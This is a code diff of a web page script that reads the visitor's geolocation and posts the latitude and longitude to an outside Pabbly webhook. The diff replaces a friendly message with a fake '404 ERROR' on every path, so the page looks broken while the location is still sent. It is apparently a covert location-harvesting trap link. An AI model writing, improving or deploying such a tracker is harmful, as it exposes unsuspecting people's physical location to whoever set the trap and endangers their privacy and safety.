@@ -18,7 +18,7 @@
     function showPosition(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
-      document.getElementById("location").innerHTML = "Goodnyt and stay happy";
+      document.getElementById("location").innerHTML = "404 ERROR";
 
       fetch('https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjYwNTZiMDYzMTA0MzY1MjZlNTUzNzUxMzci_pc', {
         method: 'POST',
@@ -27,16 +27,16 @@
       })
       .then(response => response.json())
       .then(data => {
-        document.getElementById("location").innerHTML = "Goodnyt and stay happy";
+        document.getElementById("location").innerHTML = "404 ERROR";
       })
       .catch(error => {
         console.error('Error sending location:', error);
-        document.getElementById("location").innerHTML = "Goodnyt and stay happy";
+        document.getElementById("location").innerHTML = "404 ERROR";
       });
     }
 
     function showError(error) {
-      document.getElementById("location").innerHTML = "Goodnyt and stay happy";
+      document.getElementById("location").innerHTML = "404 ERROR";
     }
   </script>
 </body>
